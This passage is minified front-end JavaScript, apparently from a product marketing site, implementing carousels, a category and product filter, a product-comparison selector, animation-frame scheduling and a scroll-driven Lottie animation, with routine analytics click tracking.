$inject(){return["$element","$scope"]}constructor(t,e){this.el=t[0],this.slideCarousel=tl.createSlideCarousel_(this.el),this.titleCarousel=tl.createTitleCarousel_(this.el),Oo.getSingleton().syncCarousels(this.slideCarousel,this.titleCarousel),e.$on("$destroy",(()=>this.dispose_()))}handleNext(){Qa.trackCarouselNavigationClick(this.el,null,"next"),this.slideCarousel.next()}handlePrevious(){Qa.trackCarouselNavigationClick(this.el,null,"prev"),this.slideCarousel.previous()}static createTitleCarousel_(t){let e=t.querySelector(`.${cn.TITLES_CONTAINER}`),i=Array.from(t.querySelectorAll(`.${cn.TITLE}`));return new Up(e,i,{activeCssClass:cn.TITLE_CENTER,beforeCssClass:cn.TITLE_LEFT,afterCssClass:cn.TITLE_RIGHT})}static createSlideCarousel_(t){let e=t.querySelector(`.${cn.SLIDES_CONTAINER}`),i=Array.from(t.querySelectorAll(`.${cn.SLIDE}`));return new Up(e,i,{activeCssClass:cn.SLIDE_CENTER,beforeCssClass:cn.SLIDE_LEFT,afterCssClass:cn.SLIDE_RIGHT,transition:new Yp({transitionTime:1e3})})}dispose_(){this.slideCarousel.destroy(),this.titleCarousel.destroy()}},fC=tl;function dC(t,e){de.measure((function(){de.mutate((function(){return(new fo).translate(e).applyToElementTransform(t)}))}))}var iN={BK_IMAGE:te.mqnCssName("mqn2-background-image"),SCROLLER_ITEM_IMAGE:te.mqnCssName("mqn2-parallax-carousel__scroller__item__image")},nN={ITEM:"mqn-parallax-carousel-item",ITEM_BG_IMAGE:"mqn-parallax-carousel-item-background-image",ITEM_DEPTH:"mqn-parallax-carousel-item-depth"};function sN(){return window.innerWidth||document.documentElement.clientWidth}var pC=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.rl_=de.getDestroyableInstance(),this.backgroundImages_=Xe.usingFunction((t=>t.querySelector(`.${iN.BK_IMAGE}`))),this.pxCarouselItems_=Array.from(t[0].querySelectorAll(`[${nN.ITEM}]`)),this.lastWindowWidth_=null,this.lastElementCenters_=new Map,this.init_(),e.$on("$destroy",(()=>this.dispose_()))}init_(){this.renderLoop_()}renderLoop_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.renderLoop_()));let t=sN();this.pxCarouselItems_.forEach(((e,i)=>this.translateElement_(e,i,t))),this.lastWindowWidth_=t}))}translateElement_(t,e,i){let r=ln(t);if(this.lastWindowWidth_===i&&this.lastElementCenters_.get(r)===r)return;this.lastElementCenters_.set(t,r);let n=i/2,s=t.offsetWidth/2,o=n+s,a=new Ae(-o,o),l=this.backgroundImages_.get(t),h=l.offsetWidth/2-s,c=new Ae(h,-h);if(a.contains(r)){let t=a.getValueAsPercent(r),e=c.getPercentAsValue(t);dC(l,new Je(e,0))}}dispose_(){this.backgroundImages_.clear(),this.lastElementCenters_.clear(),this.rl_.destroy()}},mC=pC,oN=Gc(),gC=class{static get $inject(){return["$rootScope","$element","$scope","$window"]}constructor(t,e,i,r){this.jQuery=window.jQuery,this.$scope=i,this.$rootScope=t,this.$window=r,this.el=e[0],this.originalData=null,this.data=null,this.categoryData=null,this.activeCategories=[],this.query=null,this.toggleState=null,window.URLSearchParams&&(this.queryString=new URLSearchParams(location.search),this.queryStringCategories=this.queryString.getAll("category")||[],this.queryStringQuery=this.queryString.get("search")||null)}init(t){this.data=t,this.originalData=t,this.resetFiltersAndQuery(),this.queryString&&window.setTimeout((()=>{this.queryStringCategories.forEach((t=>{this.categoryFilterClick(t)})),this.query=this.queryStringQuery,this.update()})),location.hash&&(this.$window.onload=()=>{let t=this.jQuery(location.hash).offset(),e=0;if(t){e=parseInt(t.top);let i=document.querySelector("[pdp-bar]");i&&(e-=i.offsetHeight)}window.setTimeout((()=>{this.jQuery("html, body").scrollTop(e)}))})}defaultFilterSelection(){return this.activeCategories.length===this.originalData.length}resetFiltersAndQuery(){this.activeCategories=this.originalData.map((t=>t.category.id)),this.categoryData=this.originalData.map((t=>t.category)),this.query=null,this.update(!0)}resetQuery(){this.query=null,this.update()}isActiveCategory(t){return-1!==this.activeCategories.indexOf(t)}getOriginalItem(t){let e=t.category.id;return this.originalData.filter((t=>t.category.id==e))[0]}clearCategories(){this.activeCategories=[],this.update()}toggleCategory(t){this.isActiveCategory(t)?this.removeCategoryFilter_(t):this.addCategoryFilter_(t)}categoryFilterClick(t){this.defaultFilterSelection()?this.getCheckedCategories().length>1?this.toggleCategory(t):(this.clearCategories(),this.addCategoryFilter_(t)):this.toggleCategory(t),0===this.activeCategories.length&&(this.activeCategories=this.originalData.map((t=>t.category.id)),this.update())}addCategoryFilter_(t){this.activeCategories.push(t),this.update()}removeCategoryFilter_(t){let e=this.activeCategories.indexOf(t);e>-1&&this.activeCategories.splice(e,1),this.update()}getCheckedCategories(){return this.categoryData.filter(((t,e)=>t.isChecked))}update(t){let e=JSON.parse(JSON.stringify(this.originalData));this.data=e.filter((t=>{let e=!1;return this.activeCategories.forEach((i=>{i==t.category.id&&(e=!0)})),e})),this.data.forEach(((t,e)=>{let i=t.products.filter((t=>!this.query||t.title.toLowerCase().includes(this.query.toLowerCase())));this.data[e].productIndices=i})),this.data=this.data.filter(((t,e)=>t.products.length>=1)),this.checkedCategories=this.getCheckedCategories(),this.categoryData.forEach((e=>{(t||this.defaultFilterSelection())&&(t||this.checkedCategories.length!==this.originalData.length)?e.isChecked=!1:e.isChecked=this.isActiveCategory(e.id)})),window.setTimeout((()=>{this.$scope.$apply()})),this.updateQueryString()}updateQueryString(){if(this.queryString){let t=this.categoryData.filter((t=>!0===t.isChecked)).map((t=>t.id));if(this.queryString.delete("category"),t.forEach((t=>{this.queryString.append("category",t)})),this.query&&""!==this.query?this.queryString.set("search",this.query):this.queryString.delete("search"),window.history.replaceState){let t=location.pathname;this.queryString&&""!==this.queryString.toString()&&(t+="?"+this.queryString.toString()),t+=location.hash,window.history.replaceState({},document.title,t)}}}getProductByCategory(t){let e=this.data.filter((e=>e.category.id==t));return e&&e[0]?e[0].products:[]}getProductCountByCategory(t){return this.getProductByCategory(t).length}hasNoResults(){return console.log(this.data.map((t=>t.category.id))),this.originalData.map((t=>t.category.id)).every((t=>0===this.getProductCountByCategory(t)))}convertToWebp(t){return t.endsWith(".svg")?t:oN.appendFifeWebpParam(t)}toggle(t){this.toggleState=this.toggleState==t?null:t,window.setTimeout((()=>{this.$scope.$apply()}))}},vC=gC,bC=ye(en()),wC=ye(Nt()),Xp=ye(gt()),Qp=ye(Js());function yC(t,e){for(var i=t.next();!i.done;){if(e(i.value))return!0;i=t.next()}return!1}function _C(t,e){for(var i=[],r=t.next();!r.done;)e(r.value)&&i.push(r.value),r=t.next();return i}var EC=Xe.usingFunction((t=>new SC(t))),SC=class{constructor(t){this.selectedIds_=new Map,this.groupId_=t}isSelectedElsewhere(t,e){return yC(this.selectedIds_.entries(),(([i,r])=>r===e&&i!==t))}updateId(t){this.selectedIds_.set(t,t.id),_C(this.selectedIds_.keys(),(e=>e!==t)).forEach((t=>t.digestIfPossible()))}registerController(t){this.updateId(t)}deregisterController(t){this.selectedIds_.delete(t),this.selectedIds_.size<1&&EC.delete(this.groupId_)}},AC=class{static get $inject(){return["$rootScope","$element","$scope","$attrs"]}constructor(t,e,i,r){this.el=e[0],this.$scope=i,this.$rootScope=t,this.domWatcher=new wC.DomWatcher,this.togglerId=+this.el.getAttribute("data-toggler-index"),this.nonFilterUrlParams_="",this.id=null,this.pdpTogglerSelected="pdpTogglerSelected",r.togglerGroup&&(this.pdpTogglerSelected+=r.togglerGroup),this.groupState_=EC.get(this.pdpTogglerSelected),this.groupState_.registerController(this),this.domWatcher.add({element:window,on:"smartResize",callback:()=>{window.setTimeout((()=>{let t=Array.from(this.el.querySelectorAll("[contents]")),e=0;t.forEach((t=>{let i=Xp.dom.getStyle(t),r=t.offsetTop+Qp.cssUnit.parse(i.paddingTop).value+Qp.cssUnit.parse(i.marginTop).value;e=Math.max(e,r)})),Xp.dom.setCssVariable(this.el,"--toggler-top",e+"px")}))},eventOptions:{passive:!0},id:"resize"}),this.domWatcher.run("resize"),i.$on("$destroy",(()=>{this.dispose_()}))}getIdFromUrl_(t){if(!window.URLSearchParams||!location.search)return!1;let e=new URLSearchParams(location.search.slice(1)).get("toggler"+this.togglerId);return-1!==t.indexOf(e)&&e}getUrlParams_(){if(!window.URLSearchParams)return this.nonFilterUrlParams_;let t=new URLSearchParams(location.search.slice(1));return t.delete("toggler"+this.togglerId),t.append("toggler"+this.togglerId,this.id),t.toString()}setUrlParams_(){if(window.history.replaceState){let t=this.getUrlParams_(),e=location.pathname;t&&(e+="?"+t),window.history.replaceState({},document.title,e)}}init(t,e){let i=this.getIdFromUrl_(e)||t;if(this.groupState_.isSelectedElsewhere(this,i))for(let t=0;t<e.length;t++)if(!this.groupState_.isSelectedElsewhere(this,e[t])){i=e[t];break}this.updateId(i),window.setTimeout((()=>this.$scope.$apply()))}shouldShowProductOption(t){let e=this.id===t,i=this.groupState_.isSelectedElsewhere(this,t);return e||!i}digestIfPossible(){this.$scope.$$phase||this.$scope.$apply()}handleChange(){setTimeout((()=>{this.groupState_.updateId(this),this.setUrlParams_(),this.sendChangeEvent(),this.cleanUpEmptyOptions()}))}updateId(t){this.id=t,this.groupState_.updateId(this)}sendChangeEvent(){let t=Tt.getClosestMqnFrame(this.el),e=t.getAttribute("mqn-autotrack-action"),i=t.getAttribute("mqn-autotrack-partial-type"),r={event:"module click",eventCategory:"module click",eventAction:"toggle comparison",eventLabel:this.id,pageName:window.location.pathname,moduleName:e,moduleType:i,nonInteraction:"0"};bC.default.trackDataLayer(r),window.setTimeout((()=>{this.$rootScope.$emit("mqnRunEqualSize")}))}cleanUpEmptyOptions(){window.setTimeout((()=>{Array.from(this.el.querySelectorAll("option")).forEach((t=>{1==t.hidden&&t.remove(),t.value.startsWith("?")&&t.remove()}))}),200)}getCurrentNumberOfOptionsDisplayed(){return this.el.querySelector("select").options.length}dispose_(){this.windowResizeListener&&this.windowResizeListener(),this.domWatcher.dispose(),this.groupState_.deregisterController(this),this.groupState_=null}},CC=AC,IC=ye(en());function aN(){return lN()||cN()}function lN(){return/iPhone|iPad|iPod/i.test(navigator.userAgent)||uN()}function cN(){return/Android/i.test(navigator.userAgent)}function uN(){return-1!==navigator.userAgent.toLowerCase().indexOf("macintosh")&&Boolean(navigator.maxTouchPoints)&&navigator.maxTouchPoints>2}function hN(t,e){let i=0,r=e=>{let r=window.innerWidth;(!aN()||i!==r)&&(t(e),i=r)};return window.addEventListener("resize",r,e),()=>{window.removeEventListener("resize",r)}}var TC=class{constructor(){this.watcherConfigs=[]}add(t){Array.isArray(t.on)?t.on.forEach((e=>{let i=Object.assign({},t);i.on=e,this.addSingleEvent(i)})):this.addSingleEvent(t)}addSingleEvent(t){let e=e=>{t.runWhen?t.runWhen()&&t.callback(e):t.callback(e)};if(t.listener=e,"smartResize"===t.on)t.remover=hN(e,t.eventOptions||{});else if("resize"===t.on&&t.element!==window){let i=new ResizeObserver((t=>{e(t)}));i.observe(t.element),t.remover=()=>{i.unobserve(t.element)}}else if("mutation"===t.on){let i=new MutationObserver((t=>{e(t)}));i.observe(t.element,t.eventOptions),t.remover=()=>{i.disconnect()}}else t.element,MediaQueryList,t.element.addEventListener(t.on,e,t.eventOptions||{}),t.remover=()=>{t.element.removeEventListener(t.on,e,t.eventOptions||{})};this.watcherConfigs.push(t)}removeById(t){this.watcherConfigs=this.watcherConfigs.filter((e=>{if(e.id&&e.id===t){let t=e.remover;return t&&t(),!1}return e}))}removeAll(){this.watcherConfigs.forEach((t=>{let e=t.remover;e&&e()})),this.watcherConfigs=[]}run(t){this.watcherConfigs.filter((e=>e.id&&e.id===t)).forEach((t=>{t.callback()&&t.callback()}))}dispose(){this.removeAll()}},fN=class{constructor(){this.resolve=()=>{},this.reject=()=>{},this.complete=!1,this.promise=new Promise(((t,e)=>{this.resolve=e=>(this.complete=!0,t(e)),this.reject=t=>(this.complete=!0,e(t))}))}getPromise(){return this.complete?new Promise((t=>{t()})):this.promise}},dN=class{static inview(t,e={},i){let r=null,n=null,s=null,o=!1,a=new fN,l=window.location.search.split("evBypass=")[1];if(l=l&&l.split("&")[0],"true"===l)return window.setTimeout((()=>{i&&i(t,{isIntersecting:!0,isVisible:!0},(()=>{})),a.resolve()})),{observer:null,dispose:()=>{},state:()=>({ready:!0,inview:!0}),readyPromise:a.getPromise()};let h=()=>{c&&c.unobserve(t),c&&c.disconnect(),r=[],n=null},c=new IntersectionObserver((e=>{e.length>=1&&(r=e,n=e.slice(-1)[0],s=n.isIntersecting,o=!0,a.resolve()),i&&i(t,e.slice(-1)[0],h)}),e);return c.observe(t),{observer:c,dispose:h,state:()=>({changes:r,lastChange:n,inview:s,ready:o}),readyPromise:a.getPromise()}}},xC=class{constructor(t){this.isReadWriteOnly=!1,this.callbacks=[],this.isDisposed=!1,this.raf_=null,this.frame=null,this.lastUpdateTime=0,this.fps=0,this.currentFps=0,this.isPlaying=!1,this.isRunningRaf=!1,this.callbacks=[],this.runCondition=null,this.delta=0,this.elaspedTime=0,this.startTime=0,t?this.watch(t):this.isReadWriteOnly=!0,window.DEGU_RAF_REGISTRY&&window.DEGU_RAF_REGISTRY.register(this)}watch(t){this.callbacks.push(t)}setReadWriteMode(t){this.isReadWriteOnly=t}preRead(t){window.DEGU_RAF_REGISTRY&&window.DEGU_RAF_REGISTRY.addOneTimePreRead({callback:t,raf:this})}read(t){window.DEGU_RAF_REGISTRY&&window.DEGU_RAF_REGISTRY.addOneTimeRead({callback:t,raf:this})}waitRead(){return new Promise((t=>{window.DEGU_RAF_REGISTRY&&window.DEGU_RAF_REGISTRY.addOneTimeRead({callback:()=>{t()},raf:this})}))}write(t){window.DEGU_RAF_REGISTRY&&window.DEGU_RAF_REGISTRY.addOneTimeWrite({callback:t,raf:this})}waitWrite(){return new Promise((t=>{window.DEGU_RAF_REGISTRY&&window.DEGU_RAF_REGISTRY.addOneTimeWrite({callback:()=>{t()},raf:this})}))}postWrite(t){window.DEGU_RAF_REGISTRY&&window.DEGU_RAF_REGISTRY.addOneTimePostWrite({callback:t,raf:this})}unwatch(t){this.callbacks=this.callbacks.filter((e=>e===t))}runWhen(t){this.runCondition=t}runWhenElementIsInview(t,e){return this.ev&&this.ev.dispose(),this.runCondition=null,this.ev=dN.inview(t,e||{}),this.runWhen((()=>this.ev&&this.ev.state().inview)),this.ev.readyPromise}setFps(t){this.fps=t}start(t=!1){!t&&this.isPlaying||(this.startTime=("undefined"==typeof performance?Date:performance).now(),this.animationLoop_(),this.isPlaying=!0)}stop(){this.isPlaying=!1,window.cancelAnimationFrame(this.raf_),this.isRunningRaf=!1}dispose(){this.ev&&this.ev.dispose(),this.callbacks=[],this.isDisposed=!0,this.stop(),window.DEGU_RAF_REGISTRY&&window.DEGU_RAF_REGISTRY.unregister(this)}getDelta(t){return t?this.delta/1e3:this.delta}getElapsedTime(){return this.elaspedTime}getStartTime(){return this.startTime}getCurrentFps(){return this.currentFps}animationLoop_(){if(!this.isRunningRaf){if(this.raf_=window.requestAnimationFrame((t=>{this.frame=t,this.isRunningRaf=!1,this.animationLoop_()})),this.isRunningRaf=!0,this.lastUpdateTime){let t=Date.now()-this.lastUpdateTime;this.delta=t,this.elaspedTime+=t/1e3;let e=0===this.fps?0:1e3/this.fps;this.currentFps=1e3/t,t>e&&(this.callbacks&&this.callbacks.forEach((e=>{let i=()=>{e(this.frame,this.lastUpdateTime,t,(()=>{this.stop()}))};this.runCondition?this.runCondition()&&i():i()})),this.lastUpdateTime=Date.now())}this.lastUpdateTime||(this.lastUpdateTime=Date.now())}}},rl=class{constructor(){this.flushScheduled=!1,this.preReads=[],this.reads=[],this.writes=[],this.postWrites=[],this.rafs=[]}static runRafCallbacks(t){for(;t.length;){let e=t.splice(0,1)[0];!e.raf.isDisposed&&(e.raf.isPlaying||e.raf.isReadWriteOnly)&&e.callback()}}start(){this.flushScheduled||(this.flushScheduled=!0,requestAnimationFrame((()=>{this.runRaf()})))}runRaf(){window.DEGU_RAF_REGISTRY_DEBUG&&console.log("Running raf",this.reads.length,this.writes.length),rl.runRafCallbacks(this.preReads),rl.runRafCallbacks(this.reads),rl.runRafCallbacks(this.writes),rl.runRafCallbacks(this.postWrites),this.flushScheduled=!1,(this.preReads.length||this.reads.length||this.writes.length||this.postWrites.length)&&this.start()}addOneTimePreRead(t){this.preReads.push(t),this.start()}addOneTimeRead(t){this.reads.push(t),this.start()}addOneTimeWrite(t){this.writes.push(t),this.start()}addOneTimePostWrite(t){this.postWrites.push(t),this.start()}getActiveRafCount(){return this.rafs.filter((t=>t.isPlaying)).length}getRafCount(){return this.rafs.length}register(t){this.rafs.push(t)}unregister(t){this.rafs=this.rafs.filter((e=>e===t))}};function Du(t,e){return t.filter((function(t){return-1===e.indexOf(t)}))}"undefined"!=typeof window&&!window.DEGU_RAF_REGISTRY&&(window.DEGU_RAF_REGISTRY=new rl);var Lo={DROP_DOWN_ICON:te.mqnCssName("mqn2-template-product-comparison__dropdown-icon"),OPTION:te.mqnCssName("mqn2-template-product-comparison__product__option"),SELECT:te.mqnCssName("mqn2-template-product-comparison__product__select"),TOGGLER:te.mqnCssName("mqn2-template-product-comparison__product__toggler"),TOGGLER_STICKY_BG:te.mqnCssName("mqn2-template-product-comparison__toggler-sticky-bg"),VALUE_DISPLAY:te.mqnCssName("mqn2-template-product-comparison__product__styled-value")},PC=class{constructor(t){this.element_=t,this.rl_=de.getDestroyableInstance(),this.domWatcher_=new TC,this.togglers_=[]}init(){this.domWatcher_.add({element:window,on:"smartResize",callback:()=>{this.hideInvalidOptions(),this.updateContent()},eventOptions:{passive:!0},id:"resize"});let t=Array.from(this.element_.querySelectorAll(`.${Lo.TOGGLER}`)).map((t=>new OC(t,this)));t.forEach((t=>this.togglers_.push(t))),t.forEach((t=>t.init()))}updateToggler(t,e){let i=t.getProduct();null!==e&&this.togglers_.filter((e=>e!==t)).filter((t=>t.getProduct()===i)).forEach((t=>t.setProduct(e,!1))),this.hideInvalidOptions(),this.updateContent()}updateContent(){let t=new Map,e=rt.isDsTabletLt()?2:this.togglers_.length;this.togglers_.filter(((t,i)=>i<e)).forEach((e=>{t.set(e.getProduct(),e.getColumnStyle())})),this.rl_.measure((()=>{Array.from(this.element_.querySelectorAll("[data-product]")).forEach((e=>{let i=e.dataset.product;this.rl_.mutate((()=>{t.has(i)?(Ie(e,"display",""),Ie(e,"grid-column",t.get(i))):(Ie(e,"grid-column",""),Ie(e,"display","none"))}))}))}))}hideInvalidOptions(){this.togglers_.forEach((t=>t.hideInvalidOptions()))}getSelectedProducts(){return new Set(this.togglers_.map((t=>t.getProduct())))}getTabletLtTogglers(){return this.togglers_.filter(((t,e)=>e<2))}getProductsSelectedOnTabletLt(){return new Set(this.getTabletLtTogglers().map((t=>t.getProduct())))}dispose(){this.domWatcher_.dispose(),this.rl_.destroy(),this.togglers_.forEach((t=>t.dispose())),this.togglers_=null}},OC=class{constructor(t,e){this.element_=t,this.select_=this.element_.querySelector(`.${Lo.SELECT}`),this.options_=Array.from(this.select_.querySelectorAll(`.${Lo.OPTION}`)),this.togglerId=+this.element_.getAttribute("data-toggler-index"),this.columnStyle_=`${parseInt(this.togglerId)+1} / span 1`,this.lastKnownValue_=this.select_.value,this.group_=e,this.valueDisplay_=this.element_.querySelector(`.${Lo.VALUE_DISPLAY}`),this.wasSingleOption_=null,this.optionState_=Xe.usingFunction((()=>null)),this.dropdownIcon_=this.element_.querySelector(`.${Lo.DROP_DOWN_ICON}`),this.rl_=de.getDestroyableInstance()}init(){let t=this.getProductFromUrl_()||this.select_.value;this.initializeProduct_(t),this.renderLoop_()}getProductFromUrl_(){return window.URLSearchParams&&location.search?new URLSearchParams(location.search.slice(1)).get(`toggler${this.togglerId}`):null}initializeProduct_(t){let e=this.select_.value;this.lastKnownValue_=t,this.select_.value=t,this.valueDisplay_.innerText=t,this.group_.updateToggler(this,e)}getColumnStyle(){return this.columnStyle_}getProduct(){return this.lastKnownValue_}renderLoop_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.renderLoop_())),this.setProduct(this.select_.value)}))}setProduct(t,e=!0){if(t===this.lastKnownValue_)return;let i=this.lastKnownValue_;this.lastKnownValue_=t;let r=this.options_.find((e=>e.value===t));r&&this.enableOption_(r),this.select_.value=t,this.valueDisplay_.innerText=t,e&&this.group_.updateToggler(this,i),this.setUrlParams_(),this.sendChangeEvent_()}hideInvalidOptions(){let t=this.options_.filter((t=>this.shouldShowOption(t)));Du(this.options_,t).forEach((t=>this.disableOption_(t))),t.forEach((t=>this.enableOption_(t)));let e=1===t.length;e!==this.wasSingleOption_&&(this.wasSingleOption_=e,this.rl_.mutate((()=>{e?(this.select_.setAttribute("aria-hidden",!0),this.select_.setAttribute("role","heading"),this.valueDisplay_.removeAttribute("aria-hidden"),Ie(this.dropdownIcon_,"display","none")):(this.select_.removeAttribute("aria-hidden"),this.select_.removeAttribute("role"),this.valueDisplay_.setAttribute("aria-hidden",!0),Ie(this.dropdownIcon_,"display",""))})))}disableOption_(t){!1!==this.optionState_.get(t)&&(this.optionState_.set(t,!1),this.rl_.mutate((()=>{if(t.setAttribute("disabled",!0),Un.isCurrentBrowser())try{this.select_.removeChild(t)}catch(t){}else t.setAttribute("hidden",!0),t.setAttribute("aria-hidden",!0)})))}enableOption_(t){!0!==this.optionState_.get(t)&&(this.optionState_.set(t,!0),this.rl_.mutate((()=>{t.removeAttribute("disabled"),Un.isCurrentBrowser()?this.select_.appendChild(t):(t.removeAttribute("hidden"),t.removeAttribute("aria-hidden"))})))}generateUrlParams_(){if(!window.URLSearchParams)return"";let t=new URLSearchParams(location.search.slice(1));return t.delete("toggler"+this.togglerId),t.append("toggler"+this.togglerId,this.getProduct()),t.toString()}setUrlParams_(){if(window.history.replaceState){let t=this.generateUrlParams_(),e=location.pathname;t&&(e+="?"+t),window.history.replaceState({},document.title,e)}}shouldShowOption(t){let e=t.value,i=this.getProduct()===e,r=rt.isDsTabletLt()?this.group_.getProductsSelectedOnTabletLt().has(e):this.group_.getSelectedProducts().has(e);return i||!r}sendChangeEvent_(){let t=Tt.getClosestMqnFrame(this.element_),e=t.getAttribute("mqn-autotrack-action"),i=t.getAttribute("mqn-autotrack-partial-type"),r={event:"module click",eventCategory:"module click",eventAction:"toggle comparison",eventLabel:this.id,pageName:window.location.pathname,moduleName:e,moduleType:i,nonInteraction:"0"};IC.default.trackDataLayer(r)}dispose(){this.rl_.destroy()}},RC=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.element_=t[0],this.togglerGroup_=new PC(this.element_),this.togglerStickyBg_=this.element_.querySelector(`.${Lo.TOGGLER_STICKY_BG}`),this.raf_=new xC(this.rafLoop.bind(this)),this.raf_.runWhenElementIsInview(this.element_),this.raf_.start(),e.$on("$destroy",(()=>this.dispose_()))}init(){this.togglerGroup_.init(),this.checkForMissingIcons()}rafLoop(){!this.togglerStickyBg_||this.raf_.read((()=>{let t=this.getStickyOffset(this.togglerStickyBg_),e=document.querySelector("[data-test-navbar]");this.raf_.write((()=>{this.element_.classList.toggle("mqn-opt--is-sticky",t<=0),this.element_.classList.toggle("mqn-opt--is-sticky-scroll-past",t<0),e&&(e.style.boxShadow=0===t?"none":null)}))}))}getStickyOffset(t){let e=window.getComputedStyle(t),i=t.getBoundingClientRect(),r=this.pxToNumber(e.top);return i.top-r}pxToNumber(t){return parseInt(t.slice(0,t.length-2))}checkForMissingIcons(){let t=Array.from(this.element_.querySelectorAll("[data-section]")),e=new Set;t.map((t=>t.getAttribute("data-section"))).forEach((t=>t&&e.add(t))),e.forEach((e=>{let i=!1,r=t.filter((t=>t.getAttribute("data-section")===e&&(t.querySelector('[data-element="icon-image"]')&&(i=!0),!0)));i&&r.forEach((t=>{t.querySelector('[data-element="icon-image"]')||t.classList.add("mqn-opt--missing-icons")}))}))}dispose_(){this.raf_.dispose(),this.togglerGroup_.dispose()}},MC=RC,Do=ye(gt()),$C=ye(Fa()),LC=ye(Nt()),ku=()=>[document.scrollingElement,document.documentElement,document.body].reduce(((t,e)=>e?.scrollHeight>t?.scrollHeight?e:t)),Kp=.34,il={LOTTIE:te.mqnCssName("mqn2-lottie-elevator__lottie"),ELEVATOR:te.mqnCssName("mqn2-lottie-elevator__elevator"),SPACER:te.mqnCssName("mqn2-lottie-elevator__spacer"),SHAFT:te.mqnCssName("mqn2-lottie-elevator__shaft"),COVER:"mqn-ext-lottie-elevator--cover",EARLY_SCROLL_HEIGHT:te.mqnCssName("mqn2-lottie-elevator__early-scroll-height")},DC=class{constructor(t){this.element_=t,this.start_=parseInt(t.getAttribute("data-start-frame")),this.end_=parseInt(t.getAttribute("data-end-frame")),this.range_=null,this.isAutoplay_="true"===t.getAttribute("data-autoplay").toLowerCase()}getElement(){return this.element_}getRange(t){return null===this.range_&&(-1===this.end_?this.range_=new Ae(this.start_,t):this.range_=new Ae(this.start_,this.end_)),this.range_}getPxPerFrame(){return this.element_.offsetHeight/this.range_.getDistance()}isAutoplay(){return this.isAutoplay_}},kC=class{constructor(t){this.variable_=t.id,this.frameRange_=new Ae(parseFloat(t.from),parseFloat(t.to));let e=t.cubic_bezier_values?t.cubic_bezier_values.split(",").map((t=>parseFloat(t))):[1,1,0,0];this.bezier_=new si(...e);let i="number"==typeof t.start?iu:ut;this.styleRange_=new ja(i.fromStyleString(t.start),i.fromStyleString(t.end))}getValueForFrame_(t){return this.styleRange_.getPercentAsValue(this.bezier_.getAdjustedPercent(this.frameRange_.getValueAsPercent(t))).toStyleString()}updateValueOnElement(t,e){de.mutate((()=>Ie(t,this.variable_,this.getValueForFrame_(e))))}},Zp=class{static get $inject(){return["$element","$scope","mqnTemplateLottieElevatorService"]}constructor(t,e,i){this.element_=t[0],this.scrollElement=ku(),this.mqnTemplateLottieElevatorService_=i,this.rl_=de.getDestroyableInstance(),this.elevator_=this.element_.querySelector(`.${il.ELEVATOR}`),this.mqnFrame_=Tt.getClosestMqnFrame(this.element_);let r=this.element_.getAttribute("data-css-variables");this.cssVariables_=r?JSON.parse(r).map((t=>new kC(t))):[],this.lottieElement_=this.element_.querySelector(`.${il.LOTTIE}`),this.shaft_=this.element_.querySelector(`.${il.SHAFT}`),this.spacers_=Array.from(this.element_.querySelectorAll(`.${il.SPACER}`)).map((t=>new DC(t))),this.url_=this.element_.getAttribute("data-lottie-url");let n=this.element_.getAttribute("data-lottie-assets-path");this.lottieAssetsPath_="/"===n.slice(-1)[0]?n:`${n}/`,this.lottieRenderer_=this.element_.getAttribute("data-lottie-renderer")||"canvas",this.introVideoEl_=this.element_.hasAttribute("data-lottie-intro-video")&&this.element_.querySelector("video"),this.hasPlayedIntroVideo_=!1,this.introFrames_=parseFloat(this.element_.getAttribute("data-lottie-intro-frames")||0),this.preserveAspectRatio_=this.element_.getAttribute("data-preserve-aspect-ratio"),this.maxPlaybackSpeed_=parseFloat(this.element_.getAttribute("data-max-playback-speed")||Number.POSITIVE_INFINITY),this.isInIntroduction_=0!==this.introFrames_,this.lottie_=null,this.durationInFrames_=null,this.fps_=null,this.autoplayTimeout_=null,this.domWatcher_=new LC.DomWatcher,this.scroll_=_i.getSingleton(this),this.isCovered_=this.element_.classList.contains(il.COVER),this.lastElevatorDimensions_=null,this.rafProgress=new Do.RafProgress((t=>this.onRafProgressUpdate_(t))),this.init(),e.$on("$destroy",(()=>this.dispose_()))}onRafProgressUpdate_(t){this.targetFrame_=new Ae(0,this.durationInFrames_).getPercentAsValue(t),this.cssVariables_.forEach((t=>{t.updateValueOnElement(this.mqnFrame_,this.targetFrame_)})),0===this.targetFrame_&&this.introVideoEl_&&!this.hasPlayedIntroVideo_&&(this.introVideoEl_.play(),this.hasPlayedIntroVideo_=!0)}init(){this.mqnTemplateLottieElevatorService_.register(this.element_,this);let t={container:this.lottieElement_,assetsPath:this.lottieAssetsPath_,renderer:this.lottieRenderer_,loop:!1,autoplay:0!==this.introFrames_,rendererSettings:{preserveAspectRatio:this.preserveAspectRatio_},path:this.url_};this.lottie_=$C.default.loadAnimation(t),this.lottie_.addEventListener("DOMLoaded",(()=>{let t=this.lottie_.getDuration(!0),e=this.spacers_.map((e=>e.getRange(t).getMax()));this.durationInFrames_=Math.max(...e),this.fps_=this.lottie_.getDuration(!0)/this.lottie_.getDuration(!1),this.msPerFrame_=1e3/this.fps_,this.domWatcher_.add({element:window,on:"smartResize",eventOptions:{passive:!0},callback:()=>this.resize_(),id:"resize"}),this.rl_.measure((()=>{this.resize_(),this.rl_.cleanup((()=>{this.rl_.measure((()=>{this.updateProgress_(),this.scrollLoop_(),this.frameLoop_()}))}))}))}))}resize_(){this.rl_.measure((()=>{let t=this.lottie_.animationData.w,e=this.lottie_.animationData.h,i=t/e,r=this.elevator_.offsetWidth,n=this.elevator_.offsetHeight,s=r/n>i;if(this.rl_.mutate((()=>{Ie(this.mqnFrame_,"--lottie-width",`${t}`),Ie(this.mqnFrame_,"--lottie-height",`${e}`),Ie(this.mqnFrame_,"--lottie-ratio",`${i}`)})),this.isCovered_){let t=s?r:n*i,e=s?r/i:n;this.rl_.mutate((()=>{Ie(this.lottieElement_,"width",`${t}px`),Ie(this.lottieElement_,"height",`${e}px`),Ie(this.mqnFrame_,"--lottie-height-rendered",`${e}`),Ie(this.mqnFrame_,"--lottie-width-rendered",`${t}`)}))}else{let t=s?n*i:r,e=s?n:r/i;this.rl_.mutate((()=>{Ie(this.mqnFrame_,"--lottie-height-rendered",`${e}`),Ie(this.mqnFrame_,"--lottie-width-rendered",`${t}`)}))}}))}updateProgress_(){clearTimeout(this.autoplayTimeout_);let t=Sn(),e=this.shaft_.getBoundingClientRect().y-t,i=Math.max(0,-e),r=this.shaft_.offsetHeight-this.elevator_.offsetHeight,n=new 